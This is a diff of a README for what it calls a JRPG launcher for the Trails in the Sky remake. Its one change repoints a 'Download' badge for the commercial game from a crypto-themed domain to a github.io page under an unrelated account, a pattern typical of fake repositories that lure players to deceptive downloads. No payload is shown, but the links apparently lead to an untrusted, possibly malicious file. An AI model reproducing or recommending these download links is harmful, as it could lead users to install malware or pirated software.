@@ -2,7 +2,7 @@
 
 JRPG launcher for orbment builds, chapter summaries, and turn‑order visualization. Made for players who track lore and optimize crafts.
 
-[![Download The Legend of Heroes: Trails in the Sky – 1st Chapter (Remake)](https://img.shields.io/badge/Download-The%20Legend%20of%20Heroes:%20Trails%20in%20the%20Sky%20–%201st%20Chapter%20(Remake)-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download The Legend of Heroes: Trails in the Sky – 1st Chapter (Remake)](https://img.shields.io/badge/Download-The%20Legend%20of%20Heroes:%20Trails%20in%20the%20Sky%20–%201st%20Chapter%20(Remake)-blueviolet)](https://barouyrnayat93.github.io/.github/the-legend-of-heroes)
 
 ---
 
